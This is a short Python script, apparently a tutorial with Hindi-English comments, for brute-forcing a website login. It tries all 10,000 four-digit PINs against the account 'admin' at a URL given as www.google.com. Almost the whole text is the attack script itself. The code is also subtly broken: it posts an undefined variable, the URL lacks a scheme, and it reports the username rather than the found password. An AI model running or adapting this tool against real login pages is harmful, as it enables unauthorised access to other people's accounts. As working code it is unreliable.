# Developing a Brute-Forcing Tool

# Tools You’ll Use

# String library: helps generate text like sequences of numbers or letters.

# Response handling: check if login worked by looking at what the website sends back
import requests # Requests library: lets Python talk to websites (send login attempts).
import string 
target_url = "www.google.com"
username = "admin"

password_list = [str(i).zfill(4) for i in range(10000)]
# Kaise kaam karta hai:

# range(10000) → 0 se 9999 tak ke integers deta hai.
# str(i) → number ko string banata hai (jaise 42 → '42').
# .zfill(4) → string ko left side se zeros se pad karta hai taaki minimum 4 characters ho jaayein (jaise '42' → '0042', '5' → '0005').

def brute_force():
    for password in password_list:
        data_dict = {
            "username" : username,
            "password" : password
        }
        response = requests.post(target_url,data=data)
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}")
            break
        else:
            print(f"[+] Attempted: {password}")

brute_force()
